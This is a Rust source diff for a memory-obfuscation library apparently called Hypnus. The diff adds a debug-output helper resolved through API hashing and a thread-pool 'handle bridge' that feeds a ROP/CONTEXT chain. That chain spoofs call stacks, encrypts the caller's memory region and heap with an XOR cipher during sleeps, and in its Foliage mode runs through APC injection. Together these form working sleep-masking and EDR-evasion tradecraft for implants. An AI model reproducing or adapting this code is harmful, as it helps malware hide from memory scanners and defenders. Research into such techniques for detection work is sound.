@@ -472,6 +472,180 @@ impl WakeReason {
     }
 }
 
+/// DIAGNOSTIC: write a short null-terminated ASCII marker to the debugger.
+/// Resolved once and cached. Only emits when the `debug_bridge` feature is on.
+#[cfg(feature = "debug_bridge")]
+pub(crate) fn dbg(msg: &[u8]) {
+    use core::sync::atomic::{AtomicPtr, Ordering};
+    type OutputDebugStringAFn = unsafe extern "system" fn(*const u8);
+    static CACHED: AtomicPtr<core::ffi::c_void> = AtomicPtr::new(core::ptr::null_mut());
+    unsafe {
+        let mut p = CACHED.load(Ordering::Acquire);
+        if p.is_null() {
+            let k32 = dinvk::module::get_module_address(2808682670u32, Some(dinvk::hash::murmur3));
+            if k32.is_null() {
+                return;
+            }
+            // OutputDebugStringA jenkins3 hash
+            let f = dinvk::module::get_proc_address(k32, 552578120u32, Some(dinvk::hash::jenkins3));
+            if f.is_null() {
+                return;
+            }
+            CACHED.store(f as *mut _, Ordering::Release);
+            p = f as *mut _;
+        }
+        // Copy into a stack buffer and null-terminate.
+        let mut buf = [0u8; 160];
+        let n = msg.len().min(159);
+        buf[..n].copy_from_slice(&msg[..n]);
+        let f: OutputDebugStringAFn = core::mem::transmute(p);
+        f(buf.as_ptr());
+    }
+}
+
+#[cfg(not(feature = "debug_bridge"))]
+#[inline(always)]
+pub(crate) fn dbg(_msg: &[u8]) {}
+
+/// Handle-bridge state used by `WaitPrimitive::Handles` to bypass the broken
+/// in-chain `WaitForMultipleObjects` path.
+///
+/// The ROP chain's ctxs[5] can reliably execute a `WaitForSingleObject` on a
+/// single handle with a timeout (the Timeout variant) but fails when asked to
+/// execute `WaitForMultipleObjects` with handle parameters. Rather than debug
+/// the ROP-level bug, this bridge reduces the handle-wait problem to the
+/// working single-handle case:
+///
+///   1. Create an internal manual-reset event.
+///   2. Register a TP_WAIT callback on each user handle; the callback's
+///      context is the internal event handle, and it invokes
+///      `nt_set_event2_stub` (the same stub already used elsewhere in
+///      hypnus for thread-pool-callback → NtSetEvent dispatch).
+///   3. ctxs[5] becomes a plain `WaitForSingleObject(internal_event,
+///      INFINITE)` — identical to the working Timeout path.
+///   4. When any user handle signals (or the TP_WAIT's own timeout fires),
+///      the tp callback signals the internal event on a worker thread,
+///      causing ctxs[5] to wake.
+///   5. After the ROP chain exits, the caller performs a 0-ms WFMO on the
+///      real handles to determine which one signaled (or timeout), then
+///      drops this bridge to tear down the TP_WAITs and close the event.
+///
+/// The timeout is enforced by `TpSetWait`, not by `WaitForSingleObject`, so
+/// ctxs[5] always uses INFINITE.
+struct HandleBridge {
+    /// Manual-reset event signaled by any TP_WAIT callback.
+    internal_event: *mut c_void,
+    /// One TP_WAIT per user handle.
+    tp_waits: [*mut c_void; 4],
+    /// Number of valid entries in `tp_waits`.
+    tp_count: usize,
+}
+
+impl HandleBridge {
+    /// Attach TP_WAIT callbacks to each non-null user handle. Returns a
+    /// bridge whose `internal_event` is signaled when any user handle fires
+    /// or its `timeout_ms` elapses.
+    ///
+    /// `timeout_ms` semantics match Win32: `u32::MAX` = INFINITE (no timeout).
+    ///
+    /// `env` may be null to use the system default thread pool — foliage uses
+    /// this because it doesn't allocate a pool of its own (it drives the
+    /// ROP chain via APC injection on a helper thread, not thread-pool
+    /// timers/waits).
+    unsafe fn setup(
+        cfg: &Config,
+        handles: &[*mut c_void],
+        timeout_ms: u32,
+        env: *mut TP_CALLBACK_ENVIRON_V3,
+    ) -> Result<Self> {
+        dbg(b"[HB] setup: enter\n\0");
+        // Internal event: manual-reset so redundant signals from late TP
+        // callbacks (after ctxs[5] has already woken) are harmless.
+        let mut internal_event = null_mut();
+        let status = NtCreateEvent(
+            &mut internal_event,
+            EVENT_ALL_ACCESS,
+            null_mut(),
+            EVENT_TYPE::NotificationEvent,
+            0,
+        );
+        if !NT_SUCCESS(status) {
+            dbg(b"[HB] setup: NtCreateEvent FAILED\n\0");
+            bail!(s!("NtCreateEvent (bridge) failed"));
+        }
+        dbg(b"[HB] setup: internal_event created\n\0");
+
+        let mut bridge = Self {
+            internal_event,
+            tp_waits: [null_mut(); 4],
+            tp_count: 0,
+        };
+
+        // Convert timeout_ms → relative LARGE_INTEGER (100-ns units, negative
+        // = relative). INFINITE is represented by passing a null pointer.
+        let mut tp_timeout = unsafe { zeroed::<LARGE_INTEGER>() };
+        let timeout_ptr: *mut LARGE_INTEGER = if timeout_ms == u32::MAX {
+            null_mut()
+        } else {
+            tp_timeout.QuadPart = -(timeout_ms as i64) * 10_000;
+            &mut tp_timeout
+        };
+
+        for (i, &h) in handles.iter().enumerate().take(4) {
+            if h.is_null() {
+                dbg(b"[HB] setup: handle i is null, skipping\n\0");
+                continue;
+            }
+            let mut tp = null_mut();
+            let status = TpAllocWait(
+                &mut tp,
+                cfg.nt_set_event2_stub as *mut c_void,
+                internal_event,
+                env,
+            );
+            if !NT_SUCCESS(status) {
+                dbg(b"[HB] setup: TpAllocWait FAILED\n\0");
+                // `bridge` dropping handles the partial-cleanup path.
+                bail!(s!("TpAllocWait (bridge) failed"));
+            }
+            dbg(b"[HB] setup: TpAllocWait ok\n\0");
+            bridge.tp_waits[i] = tp;
+            bridge.tp_count += 1;
+            TpSetWait(tp, h, timeout_ptr);
+            dbg(b"[HB] setup: TpSetWait called\n\0");
+        }
+
+        if bridge.tp_count == 0 {
+            dbg(b"[HB] setup: no valid handles\n\0");
+            bail!(s!("handle bridge: no valid handles"));
+        }
+
+        dbg(b"[HB] setup: success\n\0");
+        Ok(bridge)
+    }
+}
+
+impl Drop for HandleBridge {
+    fn drop(&mut self) {
+        unsafe {
+            // Drain any outstanding callbacks and cancel pending ones.
+            // Must happen BEFORE NtClose(internal_event) to prevent a late
+            // callback from signaling a closed handle.
+            for i in 0..self.tp_waits.len() {
+                if !self.tp_waits[i].is_null() {
+                    TpWaitForWait(self.tp_waits[i], 1);
+                    TpReleaseWait(self.tp_waits[i]);
+                    self.tp_waits[i] = null_mut();
+                }
+            }
+            if !self.internal_event.is_null() {
+                NtClose(self.internal_event);
+                self.internal_event = null_mut();
+            }
+        }
+    }
+}
+
 /// Structure responsible for centralizing memory obfuscation techniques
 #[derive(Clone, Copy, Debug)]
 pub(crate) struct Hypnus {
@@ -581,8 +755,12 @@ impl Hypnus {
     ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
     ///   via a trampoline during ROP chain execution.
     fn timer(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
+        dbg(b"[T] timer: enter\n\0");
         let uses_handles = matches!(self.wait, WaitPrimitive::Handles { .. });
+        if uses_handles { dbg(b"[T] timer: uses_handles=true\n\0"); }
+        else            { dbg(b"[T] timer: uses_handles=false\n\0"); }
         self.cfg.validate_timer_wait_apis(uses_handles)?;
+        dbg(b"[T] timer: validate passed\n\0");
 
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
@@ -747,38 +925,35 @@ impl Hypnus {
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
             // Sleep/Wait - setup based on WaitPrimitive
-            // Storage for handle array (must live until ROP chain completes)
-            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
-            // Track if we're using handle-based wait for stack parameter setup
-            let mut using_wfmo_trampoline = false;
-            
-            match self.wait {
+            // For Handles, build a bridge: ctxs[5] waits on an internal event,
+            // and TP_WAIT callbacks on the real handles signal it. ctxs[5]
+            // becomes IDENTICAL to the Timeout path — no broken in-chain WFMO.
+            let mut bridge: Option<HandleBridge> = None;
+            let (bridge_handles, bridge_count) = match self.wait {
                 WaitPrimitive::Timeout { seconds } => {
                     // Original behavior: WaitForSingleObject on thread handle with timeout
                     ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
                     ctxs[5].Rcx = h_thread as u64;
                     ctxs[5].Rdx = seconds * 1000;
                     ctxs[5].R8  = 0;
+                    ([null_mut::<c_void>(); 4], 0usize)
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
-                    // Use WFMO trampoline to capture the return value
-                    handle_storage = handles;
-                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
-                    
-                    if using_wfmo_trampoline {
-                        // Call trampoline which wraps WFMO and stores result
-                        ctxs[5].jmp(self.cfg, self.cfg.wfmo_trampoline);
-                    } else {
-                        // Direct WFMO call (result will be lost)
-                        ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
-                    }
-                    ctxs[5].Rcx = count as u64;
-                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
-                    ctxs[5].R8  = 0; // bWaitAll = FALSE
-                    ctxs[5].R9  = timeout_ms as u64;
-                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
+                    dbg(b"[T] Handles path hit\n\0");
+                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, &mut env as *mut _)?;
+                    let internal_event = b.internal_event;
+                    bridge = Some(b);
+
+                    // Use the known-good Timeout layout: WFSO on a single handle,
+                    // INFINITE timeout (enforcement lives in TpSetWait).
+                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
+                    ctxs[5].Rcx = internal_event as u64;
+                    ctxs[5].Rdx = 0xFFFF_FFFFu64; // INFINITE
+                    ctxs[5].R8  = 0;
+                    dbg(b"[T] Handles ctxs[5] set up\n\0");
+                    (handles, count)
                 }
-            }
+            };
 
             // Decrypt region (custom SIMD XOR cipher - self-inverse)
             ctxs[6].jmp(self.cfg, self.cfg.custom_decrypt);
@@ -805,20 +980,10 @@ impl Hypnus {
 
             // Layout spoofed CONTEXT chain on stack
             self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Timer)?;
-            
-            // Ensure handle_storage lives through the ROP chain
-            let _ = &handle_storage;
 
             // Patch old_protect into expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
-            
-            // For WFMO trampoline, write 5th and 6th parameters to stack
-            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
-            if using_wfmo_trampoline {
-                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
-                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
-            }
 
             // Schedule each CONTEXT via TpSetTimer
             for ctx in &mut ctxs {
@@ -849,16 +1014,36 @@ impl Hypnus {
                 None
             };
 
+            dbg(b"[T] about to NtSignalAndWait\n\0");
             // Wait for chain completion
             status = NtSignalAndWaitForSingleObject(events[1], events[2], 0, null_mut());
             if !NT_SUCCESS(status) {
+                dbg(b"[T] NtSignalAndWait FAILED\n\0");
                 bail!(s!("NtSignalAndWaitForSingleObject Failed"));
             }
+            dbg(b"[T] chain completed\n\0");
 
             // Undo heap encryption
             if let Some(key) = key {
                 obfuscate_heap(&key);
             }
+
+            // If we used a handle bridge, do a 0-ms WFMO on the real handles
+            // now to find out which one actually signaled (or timeout). Store
+            // the result in *wfmo_result_ptr so the caller can translate it
+            // into a WakeReason. Then drop the bridge to tear down TP_WAITs.
+            if bridge.is_some() && !wfmo_result_ptr.is_null() && bridge_count > 0 {
+                let r = WaitForMultipleObjects(
+                    bridge_count as u32,
+                    bridge_handles.as_ptr(),
+                    0, // bWaitAll = FALSE
+                    0, // 0-ms poll
+                );
+                dbg(b"[T] post-chain 0ms WFMO done\n\0");
+                *wfmo_result_ptr = r as u64;
+            }
+            drop(bridge);
+            dbg(b"[T] bridge dropped\n\0");
 
             Ok(())
         }
@@ -874,8 +1059,12 @@ impl Hypnus {
     ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
     ///   via a trampoline during ROP chain execution.
     fn wait(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
+        dbg(b"[W] wait: enter\n\0");
         let uses_handles = matches!(self.wait, WaitPrimitive::Handles { .. });
+        if uses_handles { dbg(b"[W] wait: uses_handles=true\n\0"); }
+        else            { dbg(b"[W] wait: uses_handles=false\n\0"); }
         self.cfg.validate_timer_wait_apis(uses_handles)?;
+        dbg(b"[W] wait: validate passed\n\0");
 
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
@@ -1039,39 +1228,32 @@ impl Hypnus {
             ctxs[4].Rcx = h_thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep/Wait - setup based on WaitPrimitive
-            // Storage for handle array (must live until ROP chain completes)
-            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
-            // Track if we're using handle-based wait for stack parameter setup
-            let mut using_wfmo_trampoline = false;
-            
-            match self.wait {
+            // Sleep/Wait - setup based on WaitPrimitive. See HandleBridge for
+            // why Handles goes through an internal event instead of a direct
+            // in-chain WFMO.
+            let mut bridge: Option<HandleBridge> = None;
+            let (bridge_handles, bridge_count) = match self.wait {
                 WaitPrimitive::Timeout { seconds } => {
-                    // Original behavior: WaitForSingleObject on thread handle with timeout
                     ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
                     ctxs[5].Rcx = h_thread as u64;
                     ctxs[5].Rdx = seconds * 1000;
                     ctxs[5].R8  = 0;
+                    ([null_mut::<c_void>(); 4], 0usize)
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
-                    // Use WFMO trampoline to capture the return value
-                    handle_storage = handles;
-                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
-                    
-                    if using_wfmo_trampoline {
-                        // Call trampoline which wraps WFMO and stores result
-                        ctxs[5].jmp(self.cfg, self.cfg.wfmo_trampoline);
-                    } else {
-                        // Direct WFMO call (result will be lost)
-                        ctxs[5].jmp(self.cfg, self.cfg.wait_for_multiple.into());
-                    }
-                    ctxs[5].Rcx = count as u64;
-                    ctxs[5].Rdx = handle_storage.as_ptr() as u64;
-                    ctxs[5].R8  = 0; // bWaitAll = FALSE
-                    ctxs[5].R9  = timeout_ms as u64;
-                    // 5th and 6th params (result_ptr, wfmo_addr) are written after spoof()
+                    dbg(b"[W] Handles path hit\n\0");
+                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, &mut env as *mut _)?;
+                    let internal_event = b.internal_event;
+                    bridge = Some(b);
+
+                    ctxs[5].jmp(self.cfg, self.cfg.wait_for_single.into());
+                    ctxs[5].Rcx = internal_event as u64;
+                    ctxs[5].Rdx = 0xFFFF_FFFFu64; // INFINITE
+                    ctxs[5].R8  = 0;
+                    dbg(b"[W] Handles ctxs[5] set up\n\0");
+                    (handles, count)
                 }
-            }
+            };
 
             // Decrypt region (custom SIMD XOR cipher - self-inverse)
             ctxs[6].jmp(self.cfg, self.cfg.custom_decrypt);
@@ -1098,20 +1280,10 @@ impl Hypnus {
 
             // Layout spoofed CONTEXT chain on stack
             self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Wait)?;
-            
-            // Ensure handle_storage lives through the ROP chain
-            let _ = &handle_storage;
 
             // Patch old_protect into expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
-            
-            // For WFMO trampoline, write 5th and 6th parameters to stack
-            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
-            if using_wfmo_trampoline {
-                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
-                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
-            }
 
             // Schedule each CONTEXT via TpAllocWait
             for ctx in &mut ctxs {
@@ -1143,15 +1315,32 @@ impl Hypnus {
             };
 
             // Wait for chain completion
+            dbg(b"[W] about to NtSignalAndWait\n\0");
             status = NtSignalAndWaitForSingleObject(events[2], events[3], 0, null_mut());
             if !NT_SUCCESS(status) {
+                dbg(b"[W] NtSignalAndWait FAILED\n\0");
                 bail!(s!("NtSignalAndWaitForSingleObject Failed"));
             }
+            dbg(b"[W] chain completed\n\0");
 
             // De-obfuscate heap if needed
             if let Some(key) = key {
                 obfuscate_heap(&key);
             }
+
+            // Resolve wake reason for the handle-bridge path (see HandleBridge).
+            if bridge.is_some() && !wfmo_result_ptr.is_null() && bridge_count > 0 {
+                let r = WaitForMultipleObjects(
+                    bridge_count as u32,
+                    bridge_handles.as_ptr(),
+                    0, // bWaitAll = FALSE
+                    0, // 0-ms poll
+                );
+                dbg(b"[W] post-chain 0ms WFMO done\n\0");
+                *wfmo_result_ptr = r as u64;
+            }
+            drop(bridge);
+            dbg(b"[W] bridge dropped\n\0");
 
             Ok(())
         }
@@ -1164,8 +1353,12 @@ impl Hypnus {
     ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
     ///   via a trampoline during ROP chain execution.
     fn foliage(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
+        dbg(b"[F] foliage: enter\n\0");
         let uses_handles = matches!(self.wait, WaitPrimitive::Handles { .. });
+        if uses_handles { dbg(b"[F] foliage: uses_handles=true\n\0"); }
+        else            { dbg(b"[F] foliage: uses_handles=false\n\0"); }
         self.cfg.validate_foliage_apis(uses_handles)?;
+        dbg(b"[F] foliage: validate passed\n\0");
 
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
@@ -1282,37 +1475,34 @@ impl Hypnus {
             ctxs[4].Rcx = thread as u64;
             ctxs[4].Rdx = ctx_spoof.as_u64();
 
-            // Sleep/Wait - setup based on WaitPrimitive
-            // Storage for handle array (must live until ROP chain completes)
-            let mut handle_storage: [*mut c_void; 4] = [null_mut(); 4];
-            // Track if we're using handle-based wait for stack parameter setup
-            let mut using_wfmo_trampoline = false;
-            
-            match self.wait {
+            // Sleep/Wait - setup based on WaitPrimitive. Foliage doesn't
+            // allocate its own thread pool (it uses APC injection), so the
+            // bridge falls back to the system default pool via null env.
+            // See HandleBridge docs for the full rationale.
+            let mut bridge: Option<HandleBridge> = None;
+            let (bridge_handles, bridge_count) = match self.wait {
                 WaitPrimitive::Timeout { seconds } => {
-                    // Original behavior: WaitForSingleObject on thread handle with timeout
                     ctxs[5].Rip = self.cfg.wait_for_single.into();
                     ctxs[5].Rcx = thread as u64;
                     ctxs[5].Rdx = seconds * 1000;
                     ctxs[5].R8  = 0;
+                    ([null_mut::<c_void>(); 4], 0usize)
                 }
                 WaitPrimitive::Handles { handles, count, timeout_ms } => {
-                    // Use WFMO trampoline to capture the return value
-                    handle_storage = handles;
-                    using_wfmo_trampoline = !wfmo_result_ptr.is_null();
-                    
-                    if using_wfmo_trampoline {
-                        // Call trampoline which wraps WFMO and stores result
-                        ctxs[5].Rip = self.cfg.wfmo_trampoline;
-                    } else {
-                        // Direct WFMO call (result will be lost)
-                        ctxs[5].Rip = self.cfg.wait_for_multiple.into();
-                    }
-                    ctxs[5].Rcx = handles[0] as u64; // pipe event handle
-                    ctxs[5].Rdx = timeout_ms as u64;
+                    dbg(b"[F] Handles path hit\n\0");
+                    let b = HandleBridge::setup(self.cfg, &handles[..count], timeout_ms, null_mut())?;
+                    let internal_event = b.internal_event;
+                    bridge = Some(b);
+
+                    // Same layout as Timeout path — WFSO on single handle.
+                    ctxs[5].Rip = self.cfg.wait_for_single.into();
+                    ctxs[5].Rcx = internal_event as u64;
+                    ctxs[5].Rdx = 0xFFFF_FFFFu64; // INFINITE
                     ctxs[5].R8  = 0;
+                    dbg(b"[F] Handles ctxs[5] set up\n\0");
+                    (handles, count)
                 }
-            }
+            };
 
             // Decrypts the memory after waking up (custom SIMD XOR cipher - self-inverse)
             ctxs[6].Rip = self.cfg.custom_decrypt;
@@ -1339,20 +1529,10 @@ impl Hypnus {
 
             // Layout the entire spoofed CONTEXT chain on the stack
             self.cfg.stack.spoof(&mut ctxs, self.cfg, Obfuscation::Foliage)?;
-            
-            // Ensure handle_storage lives through the ROP chain
-            let _ = &handle_storage;
 
             // Write `old_protect` values into the expected return slots
             ((ctxs[1].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
             ((ctxs[7].Rsp + 0x28) as *mut u64).write(old_protect.as_u64());
-            
-            // For WFMO trampoline, write 5th and 6th parameters to stack
-            // [RSP+0x28] = result_ptr, [RSP+0x30] = wfmo_addr
-            if using_wfmo_trampoline {
-                ((ctxs[5].Rsp + 0x28) as *mut u64).write(wfmo_result_ptr as u64);
-                ((ctxs[5].Rsp + 0x30) as *mut u64).write(self.cfg.wait_for_multiple.as_u64());
-            }
 
             // Queue each CONTEXT as an APC to be executed in sequence
             for ctx in &mut ctxs {
@@ -1385,15 +1565,32 @@ impl Hypnus {
             };
 
             // Wait until the thread finishes the spoofed chain
+            dbg(b"[F] about to NtSignalAndWait\n\0");
             status = NtSignalAndWaitForSingleObject(event, h_thread, 0, null_mut());
             if !NT_SUCCESS(status) {
+                dbg(b"[F] NtSignalAndWait FAILED\n\0");
                 bail!(s!("NtSignalAndWaitForSingleObject Failed"));
             }
+            dbg(b"[F] chain completed\n\0");
 
             // De-obfuscate heap if needed
             if let Some(key) = key {
                 obfuscate_heap(&key);
             }
+
+            // Resolve wake reason for the handle-bridge path (see HandleBridge).
+            if bridge.is_some() && !wfmo_result_ptr.is_null() && bridge_count > 0 {
+                let r = WaitForMultipleObjects(
+                    bridge_count as u32,
+                    bridge_handles.as_ptr(),
+                    0, // bWaitAll = FALSE
+                    0, // 0-ms poll
+                );
+                dbg(b"[F] post-chain 0ms WFMO done\n\0");
+                *wfmo_result_ptr = r as u64;
+            }
+            drop(bridge);
+            dbg(b"[F] bridge dropped\n\0");
 
         }
 
@@ -1488,19 +1685,34 @@ pub mod __private {
     /// This uses a trampoline mechanism to capture the WFMO return value directly in the
     /// ROP chain, avoiding the race condition that existed with post-hoc polling.
     pub fn hypnus_entry_with_wait(
-        base: *mut c_void, 
-        size: u64, 
-        wait: WaitPrimitive, 
-        obf: Obfuscation, 
+        base: *mut c_void,
+        size: u64,
+        wait: WaitPrimitive,
+        obf: Obfuscation,
         mode: ObfMode
     ) -> WakeReason {
+        dbg(b"[E] hypnus_entry_with_wait: enter\n\0");
+        match &wait {
+            WaitPrimitive::Timeout { .. } => dbg(b"[E] entry: WaitPrimitive::Timeout\n\0"),
+            WaitPrimitive::Handles { .. } => dbg(b"[E] entry: WaitPrimitive::Handles\n\0"),
+        }
+        match obf {
+            Obfuscation::Timer   => dbg(b"[E] entry: Obfuscation::Timer\n\0"),
+            Obfuscation::Wait    => dbg(b"[E] entry: Obfuscation::Wait\n\0"),
+            Obfuscation::Foliage => dbg(b"[E] entry: Obfuscation::Foliage\n\0"),
+        }
         let (master, did_convert) = match acquire_fiber() {
             Some(pair) => pair,
-            None => return WakeReason::Error,
+            None => {
+                dbg(b"[E] entry: acquire_fiber FAILED\n\0");
+                return WakeReason::Error;
+            }
         };
+        dbg(b"[E] entry: acquire_fiber ok\n\0");
 
         match Hypnus::new_with_wait(base as u64, size, wait, mode) {
             Ok(hypnus) => {
+                dbg(b"[E] entry: Hypnus::new_with_wait ok\n\0");
                 let mut wfmo_result: u64 = WAIT_TIMEOUT as u64;
                 
                 let handle_count = match wait {
@@ -1533,26 +1745,32 @@ pub mod __private {
                 );
                 
                 if fiber.is_null() {
+                    dbg(b"[E] entry: CreateFiber FAILED\n\0");
                     return WakeReason::Error;
                 }
+                dbg(b"[E] entry: CreateFiber ok, switching\n\0");
 
                 SwitchToFiber(fiber);
+                dbg(b"[E] entry: returned from fiber\n\0");
                 DeleteFiber(fiber);
                 if did_convert {
                     ConvertFiberToThread();
                 }
-                
+
                 // For timeout-based waits, always return Timeout
                 if handle_count == 0 {
+                    dbg(b"[E] entry: returning Timeout (no handles)\n\0");
                     return WakeReason::Timeout;
                 }
-                
+                dbg(b"[E] entry: resolving wfmo_result\n\0");
+
                 // For handle-based waits, use the captured WFMO result.
                 // The trampoline stored the actual return value during ROP chain execution,
                 // so this works correctly for both auto-reset and manual-reset events.
                 WakeReason::from_wfmo_result(wfmo_result as u32, handle_count)
             }
             Err(_error) => {
+                dbg(b"[E] entry: Hypnus::new_with_wait FAILED\n\0");
                 #[cfg(debug_assertions)]
                 dinvk::println!("[Hypnus::new_with_wait] {:?}", _error);
                 WakeReason::Error
@@ -1579,15 +1797,20 @@ pub(crate) extern "system" fn hypnus_fiber(ctx: *mut c_void) {
     unsafe {
         let mut ctx = alloc::boxed::Box::from_raw(ctx as *mut FiberContext);
         let wfmo_result_ptr = ctx.wfmo_result_ptr;
+        dbg(b"[F0] fiber: invoking technique\n\0");
         let _result = match ctx.obf {
             Obfuscation::Timer   => ctx.hypnus.timer(wfmo_result_ptr),
             Obfuscation::Wait    => ctx.hypnus.wait(wfmo_result_ptr),
             Obfuscation::Foliage => ctx.hypnus.foliage(wfmo_result_ptr),
         };
 
-        #[cfg(debug_assertions)]
-        if let Err(_error) = _result {
-            dinvk::println!("[Hypnus] {:?}", _error);
+        match &_result {
+            Ok(()) => dbg(b"[F0] fiber: technique returned Ok\n\0"),
+            Err(_e) => {
+                dbg(b"[F0] fiber: technique returned Err\n\0");
+                #[cfg(debug_assertions)]
+                dinvk::println!("[Hypnus] {:?}", _e);
+            }
         }
 
         SwitchToFiber(ctx.master);
